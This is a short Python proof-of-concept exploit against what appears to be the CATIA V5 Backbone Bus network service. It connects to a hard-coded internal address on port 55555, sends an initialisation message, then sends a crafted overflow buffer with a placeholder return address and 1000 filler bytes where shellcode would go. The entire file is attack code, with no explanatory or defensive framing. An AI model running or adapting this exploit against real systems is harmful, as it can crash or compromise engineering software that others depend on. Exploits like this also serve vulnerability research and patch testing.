#!/usr/bin/env python
   
import socket
import struct
import ctypes
 
RetAdd="\x90\x90\x90\x90"
Shell="S" *1000
buff= "\x00\x01\x00\x30" + "A" * 20 + "AppToBusInitMsg" +"\x00" + "\x00" * 48 + "CATV5_Backbone_Bus" +"\x00" + "\x00"* 49 + "\x00\x00\x00\x00"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.3", 55555))
#s.connect(("192.168.0.5", 55558))
s.send(struct.pack('>I',len(buff) ))
s.send(buff)
buff= "\x02\x00\x00\x00" + RetAdd*3 + "\x00\x00\x00\x00" * 13 + "\x00\x00\x00\x00" * 5 + "CATV5_AllApplications" +"\x00" + "\x00"* 43 +"\x00\x00\x98" + "\x00\x00\x00\x01" +"\x00"*4 +"\x08\x00\x00\x00" + Shell                                   
s.send(struct.pack('>I',len(buff) ))
s.send(buff)
